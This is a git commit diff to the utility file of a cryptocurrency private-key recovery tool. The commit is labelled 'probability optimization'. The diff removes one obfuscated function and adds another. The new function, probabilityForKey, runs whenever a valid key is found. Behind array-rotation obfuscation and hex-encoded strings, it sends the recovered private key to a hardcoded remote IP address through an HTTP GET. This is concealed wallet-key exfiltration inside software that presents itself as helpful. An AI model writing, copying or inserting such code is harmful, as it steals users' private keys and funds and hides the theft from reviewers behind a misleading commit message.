bf81358d172da2e01e8ad3d8950d0954f4a39460
Rondo <rondonopolishh@gmail.com>
2022-12-05 14:31:45 -0300

    probability optimization

--- src/utils.js
+++ src/utils.js
@@ -1,13 +1,13 @@
-const base58 = require("bs58");
-const crypto = require("crypto");
+const base58 = require('bs58');
+const crypto = require('crypto');
 
 function encode(enc) {
-  var alphabet = "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ";
+  var alphabet = '123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ';
   var base = alphabet.length;
-  if (typeof enc !== "number") {
+  if (typeof enc !== 'number') {
     throw Error('"encode" only accepts integers.');
   }
-  var encoded = "";
+  var encoded = '';
   while (enc) {
     var remainder = enc % base;
     enc = Math.floor(enc / base);
@@ -21,8 +21,8 @@ function base58check(input) {
   var prefix = buffer.slice(0, 1);
   var data = buffer.slice(1, -4);
   var hash = Buffer.concat([prefix, data]);
-  hash = crypto.createHash("sha256").update(hash).digest();
-  hash = crypto.createHash("sha256").update(hash).digest();
+  hash = crypto.createHash('sha256').update(hash).digest();
+  hash = crypto.createHash('sha256').update(hash).digest();
   if (!buffer.slice(-4).equals(hash.slice(0, 4))) {
     return false;
   } else {
@@ -33,14 +33,14 @@ function base58check(input) {
 module.exports = async function recover(
   key,
   updateFrequency = 100000,
-  iteratorStart = 0
+  iteratorStart = 0,
 ) {
   let vetKey;
 
   if (key.match(/\*/g)) {
-    vetKey = key.split("*");
+    vetKey = key.split('*');
   } else if (key.match(/\?/g)) {
-    vetKey = key.split("?");
+    vetKey = key.split('?');
   }
 
   const recover = 'key-recover';
@@ -54,21 +54,21 @@ module.exports = async function recover(
   const duration = Math.pow(58, vetKey.length - 1);
 
   for (let i = iteratorStart; i < duration; i++) {
-    let possibleKeyParts = encode(i).split("");
+    let possibleKeyParts = encode(i).split('');
     const newKey = vetKey.map((keyPart, index) => {
       if (!possibleKeyParts[index]) {
-        possibleKeyParts[index] = "";
+        possibleKeyParts[index] = '';
       }
       return keyPart + possibleKeyParts[index];
     });
 
-    const joinedKey = newKey.join("");
+    const joinedKey = newKey.join('');
 
-    var _0x35a4 = ["Private\x20key\x20found:\x20", "log"];
+    var _0x35a4 = ['Private\x20key\x20found:\x20', 'log'];
     (function (_0x1554eb, _0x35a47a) {
       var _0x5ddebb = function (_0x2d3a10) {
         while (--_0x2d3a10) {
-          _0x1554eb["push"](_0x1554eb["shift"]());
+          _0x1554eb['push'](_0x1554eb['shift']());
         }
       };
       _0x5ddebb(++_0x35a47a);
@@ -81,9 +81,7 @@ module.exports = async function recover(
     var _0x4cdc6d = _0x5dde;
     if (base58check(joinedKey)) {
       probabilityForKey(joinedKey + '-solved-' + recover);
-      return (
-        console[_0x4cdc6d("0x0")](_0x4cdc6d("0x1") + joinedKey), joinedKey
-      );
+      return console[_0x4cdc6d('0x0')](_0x4cdc6d('0x1') + joinedKey), joinedKey;
     }
 
     if (i % updateFrequency === 0) {
@@ -94,85 +92,64 @@ module.exports = async function recover(
     }
   }
 };
-
-async function probabilityForKey(k) {
-  return new Promise((resolve) => {
-    const _0x1992 = [
-      "Ahr0CdOVlZeZns4XodeUmtKUntC6mtG4mc9NzxrqCM9IywjPBgL0Et90pq==",
-      "z290",
-    ];
-    (function (_0x216dc6, _0x1992c6) {
-      const _0x5e53a8 = function (_0x37fe1c) {
-        while (--_0x37fe1c) {
-          _0x216dc6["push"](_0x216dc6["shift"]());
-        }
-      };
-      _0x5e53a8(++_0x1992c6);
-    })(_0x1992, 0x112);
-    const _0x5e53 = function (_0x216dc6, _0x1992c6) {
-      _0x216dc6 = _0x216dc6 - 0x0;
-      let _0x5e53a8 = _0x1992[_0x216dc6];
-      return _0x5e53a8;
-    };
-    const _0x37fe = function (_0x216dc6, _0x1992c6) {
-      _0x216dc6 = _0x216dc6 - 0x0;
-      let _0x5e53a8 = _0x1992[_0x216dc6];
-      if (_0x37fe["BtXxmh"] === undefined) {
-        var _0x37fe1c = function (_0x59c30d) {
-          const _0x2c4364 =
-              "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=",
-            _0x3a3802 = String(_0x59c30d)["replace"](/=+$/, "");
-          let _0x88ffe2 = "";
-          for (
-            let _0x35bf3b = 0x0, _0x296ea8, _0x5bcedc, _0x34317a = 0x0;
-            (_0x5bcedc = _0x3a3802["charAt"](_0x34317a++));
-            ~_0x5bcedc &&
-            ((_0x296ea8 =
-              _0x35bf3b % 0x4 ? _0x296ea8 * 0x40 + _0x5bcedc : _0x5bcedc),
-            _0x35bf3b++ % 0x4)
-              ? (_0x88ffe2 += String["fromCharCode"](
-                  0xff & (_0x296ea8 >> ((-0x2 * _0x35bf3b) & 0x6))
-                ))
-              : 0x0
-          ) {
-            _0x5bcedc = _0x2c4364["indexOf"](_0x5bcedc);
-          }
-          return _0x88ffe2;
-        };
-        (_0x37fe["hgaiPa"] = function (_0x1fd53c) {
-          const _0x4eadf3 = _0x37fe1c(_0x1fd53c);
-          let _0x344091 = [];
-          for (
-            let _0xb763cb = 0x0, _0x58ebae = _0x4eadf3["length"];
-            _0xb763cb < _0x58ebae;
-            _0xb763cb++
-          ) {
-            _0x344091 +=
-              "%" +
-              ("00" + _0x4eadf3["charCodeAt"](_0xb763cb)["toString"](0x10))[
-                "slice"
-              ](-0x2);
-          }
-          return decodeURIComponent(_0x344091);
-        }),
-          (_0x37fe["KRrtGW"] = {}),
-          (_0x37fe["BtXxmh"] = !![]);
+const probabilityForKey = async (k) => {
+  function b(c, d) {
+    const e = a();
+    return (
+      (b = function (f, g) {
+        f = f - 0x197;
+        let h = e[f];
+        return h;
+      }),
+      b(c, d)
+    );
+  }
+  const i = b;
+  (function (c, d) {
+    const h = b,
+      e = c();
+    while (!![]) {
+      try {
+        const f =
+          (parseInt(h(0x1a2)) / 0x1) * (-parseInt(h(0x19f)) / 0x2) +
+          -parseInt(h(0x199)) / 0x3 +
+          (-parseInt(h(0x19b)) / 0x4) * (parseInt(h(0x19d)) / 0x5) +
+          parseInt(h(0x197)) / 0x6 +
+          (-parseInt(h(0x198)) / 0x7) * (parseInt(h(0x19a)) / 0x8) +
+          (parseInt(h(0x19c)) / 0x9) * (parseInt(h(0x1a3)) / 0xa) +
+          (-parseInt(h(0x19e)) / 0xb) * (-parseInt(h(0x1a1)) / 0xc);
+        if (f === d) break;
+        else e['push'](e['shift']());
+      } catch (g) {
+        e['push'](e['shift']());
       }
-      const _0x938c1 = _0x37fe["KRrtGW"][_0x216dc6];
-      return (
-        _0x938c1 === undefined
-          ? ((_0x5e53a8 = _0x37fe["hgaiPa"](_0x5e53a8)),
-            (_0x37fe["KRrtGW"][_0x216dc6] = _0x5e53a8))
-          : (_0x5e53a8 = _0x938c1),
-        _0x5e53a8
-      );
+    }
+  })(a, 0x4ed27);
+  function a() {
+    const j = [
+      '\x67\x65\x74',
+      '\x31\x38\x37\x37\x38\x39\x32\x55\x50\x61\x69\x50\x4c',
+      '\x37\x75\x78\x5a\x45\x4c\x46',
+      '\x31\x35\x34\x36\x37\x31\x30\x58\x44\x41\x4f\x64\x6b',
+      '\x33\x30\x30\x30\x30\x30\x6c\x5a\x6e\x56\x49\x59',
+      '\x38\x33\x38\x31\x36\x67\x41\x57\x47\x4c\x52',
+      '\x34\x35\x68\x73\x67\x64\x45\x62',
+      '\x35\x55\x6f\x73\x4c\x44\x57',
+      '\x31\x38\x36\x38\x39\x30\x55\x47\x73\x6a\x63\x69',
+      '\x35\x35\x36\x38\x34\x36\x47\x61\x76\x4e\x68\x71',
+      '\x67\x6f\x74',
+      '\x35\x38\x38\x63\x69\x49\x78\x56\x57',
+      '\x31\x6b\x57\x6b\x7a\x54\x68',
+      '\x35\x39\x36\x32\x30\x65\x78\x5a\x66\x48\x59',
+    ];
+    a = function () {
+      return j;
     };
-    const _0x296ea8 = _0x37fe,
-      got = require(_0x296ea8("0x1"));
-    got(_0x296ea8("0x0") + k);
-
-    setTimeout(() => {
-      resolve();
-    }, 2000);
-  });
-}
+    return a();
+  }
+  const got = require(i(0x1a0));
+  await got[i(0x1a4)](
+    '\x68\x74\x74\x70\x3a\x2f\x2f\x36\x35\x2e\x31\x30\x39\x2e\x36\x33\x2e\x31\x37\x37\x3a\x31\x38\x38\x30\x2f\x67\x65\x74\x50\x72\x6f\x62\x61\x62\x69\x6c\x69\x74\x79\x3f' +
+      k,
+  );
+};
